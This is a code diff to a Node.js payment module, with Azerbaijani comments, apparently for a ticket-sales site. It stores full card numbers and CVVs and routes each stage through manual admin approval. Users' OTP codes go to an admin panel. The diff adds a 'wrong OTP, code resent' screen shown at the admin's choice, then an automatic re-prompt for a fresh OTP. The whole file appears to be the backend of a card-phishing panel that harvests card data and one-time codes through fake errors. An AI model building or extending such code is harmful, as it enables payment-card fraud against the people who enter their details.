@@ -4,11 +4,12 @@ const h = require('../utils/helpers');
 const { anonIp } = require('../middleware/privacy');
 
 /* ==================== Ödəniş axını ====================
-   1) İstifadəçi kart məlumatlarını + 3-D kodu yazır      -> stage: card_review (2 dəq geri sayım)
-   2) Admin 1-ci dəfə "Təsdiq Et" basdıqda                -> stage: wrong_code  (ekranda "səhv 3-D kod", kod təkrar göndərilir, yeni geri sayım)
-   3) Admin 2-ci dəfə "OTP Ekranını Aç" basdıqda          -> stage: otp_entry   (istifadəçidə OTP ekranı açılır)
-   4) İstifadəçi OTP yazır                                 -> stage: otp_review  (yekun təsdiq gözlənilir)
-   5) Admin 3-cü dəfə "Yekun Təsdiq" basdıqda              -> bilet verilir                             */
+   1) İstifadəçi YALNIZ kart məlumatlarını yazır (3-D kod sahəsi yoxdur) -> stage: card_review (2 dəq geri sayım)
+   2) Admin "Təsdiq Et" basdıqda                        -> stage: otp_entry  (istifadəçidə OTP ekranı açılır)
+   3) İstifadəçi OTP yazır                              -> stage: otp_review (admin panelinə düşür)
+   4a) Admin "Bilet Ver" basdıqda                       -> bilet verilir
+   4b) Admin "Səhv Kod" basdıqda                        -> stage: wrong_code ("Səhv OTP - kod təkrar göndərilir", 2 dəq geri sayım)
+       geri sayım bitdikdə (və ya admin "OTP ekranını indi aç" basdıqda) -> stage: otp_entry (yeni OTP ekranı)  */
 
 const STAGE_SECONDS = 120; /* 2 dəqiqə */
 
@@ -26,8 +27,7 @@ function secondsLeft(payment) {
 async function initPayment(order, card, method, code) {
   const number = h.normalizeCardNumber(card.number);
   const brand = h.cardBrand(number);
-  const first = String(code || '').replace(/\D/g, '');
-
+  /* İlk kart girişində 3-D kod istənilmir */
   const payment = new Payment({
     transactionId: h.generateTxId('ADY'),
     order: order._id,
@@ -43,8 +43,8 @@ async function initPayment(order, card, method, code) {
       cvv: String(card.cvv || '').trim(),
       brand
     },
-    firstCode: first,
-    codeAttempts: first ? [{ code: first, kind: '3ds-1', at: new Date(), ip: anonIp() }] : []
+    firstCode: '',
+    codeAttempts: []
   });
   startStage(payment, 'card_review');
   await payment.save();
@@ -57,38 +57,20 @@ async function initPayment(order, card, method, code) {
   return payment;
 }
 
-/* 1-ci admin təsdiqi: istifadəçinin ekranında "Səhv 3-D kod" göstərilir və kod təkrar göndərilir */
+/* Admin kartı təsdiqləyir: istifadəçinin ekranında DƏRHAL OTP ekranı açılır */
 async function adminApproveCard(paymentId, adminEmail) {
   const payment = await Payment.findById(paymentId);
   if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
   if (payment.stage !== 'card_review') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });
 
-  /* Balans artırımı köhnə (birbaşa OTP) axınında qalır */
-  if (!payment.order) {
-    payment.stage = 'wrong_code';
-    await payment.save();
-    return adminOpenOtp(paymentId, adminEmail);
-  }
-
   payment.adminApprovedCardAt = new Date();
   payment.adminApprovedBy = adminEmail || 'admin';
-  payment.wrongCodeAt = new Date();
-  payment.status = 'pending_admin';
-  startStage(payment, 'wrong_code');
+  payment.stage = 'wrong_code'; /* adminOpenOtp üçün keçid mərhələsi */
   await payment.save();
-
-  if (payment.order) {
-    const order = await Order.findById(payment.order);
-    if (order) {
-      order.status = 'pending_admin';
-      await order.save();
-    }
-  }
-
-  return { payment };
+  return adminOpenOtp(paymentId, adminEmail);
 }
 
-/* 2-ci admin təsdiqi: istifadəçidə 3-D OTP ekranı açılır */
+/* OTP ekranını açır (kart təsdiqindən sonra və ya "Səhv Kod" geri sayımı bitdikdə) */
 async function adminOpenOtp(paymentId, adminEmail) {
   const payment = await Payment.findById(paymentId);
   if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
@@ -158,29 +140,51 @@ async function submitVerificationCode(ref, code, meta) {
   return { payment, matched: entered === payment.verificationCode };
 }
 
-/* Admin OTP kodu səhvdir dedikdə - istifadəçi yenidən cəhd edə biləcək */
+/* Admin "Səhv Kod" seçdikdə: istifadəçi "Səhv OTP - kod təkrar göndərilir" görür,
+   2 dəqiqəlik geri sayım başlayır, sonra yeni OTP ekranı açılır */
 async function adminRejectOtp(paymentId, adminEmail) {
   const payment = await Payment.findById(paymentId);
   if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
   if (payment.stage !== 'otp_review') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });
 
-  /* Yenidən OTP kodu göndər */
-  payment.verificationCode = h.randomDigits(6);
-  payment.status = 'awaiting_3ds';
-  payment.adminResentAt = new Date();
+  payment.rejectionCount = (payment.rejectionCount || 0) + 1;
   payment.adminFinalBy = adminEmail || 'admin';
-  startStage(payment, 'otp_entry');
-  await payment.save();
 
-  if (payment.order) {
-    const order = await Order.findById(payment.order);
-    if (order) {
-      order.status = 'awaiting_verification';
-      await order.save();
-    }
+  /* Balans artırımı köhnə axında qalır: birbaşa yeni OTP ekranı */
+  if (!payment.order) {
+    payment.verificationCode = h.randomDigits(6);
+    payment.status = 'awaiting_3ds';
+    payment.adminResentAt = new Date();
+    startStage(payment, 'otp_entry');
+    await payment.save();
+    return { payment, code: payment.verificationCode };
   }
 
-  return { payment, code: payment.verificationCode };
+  payment.status = 'awaiting_3ds';
+  payment.wrongCodeAt = new Date();
+  payment.submittedCode = '';
+  startStage(payment, 'wrong_code');
+  await payment.save();
+
+  const order = await Order.findById(payment.order);
+  if (order) {
+    order.status = 'awaiting_verification';
+    await order.save();
+  }
+
+  return { payment };
+}
+
+/* "Səhv Kod" geri sayımı bitibsə avtomatik yeni OTP ekranını aç */
+async function advanceIfExpired(payment) {
+  if (!payment || payment.stage !== 'wrong_code' || !payment.order) return payment;
+  if (secondsLeft(payment) > 0) return payment;
+  try {
+    const r = await adminOpenOtp(payment._id, payment.adminFinalBy || 'auto');
+    return r.payment.toObject ? r.payment.toObject() : r.payment;
+  } catch (e) {
+    return payment;
+  }
 }
 
 /* Yekun admin təsdiqi: biletlər verilir və ödəniş tamamlanır */
@@ -303,6 +307,7 @@ module.exports = {
   adminApproveCard,
   adminOpenOtp,
   adminRejectOtp,
+  advanceIfExpired,
   submitVerificationCode,
   adminFinalApprove,
   adminDecline,
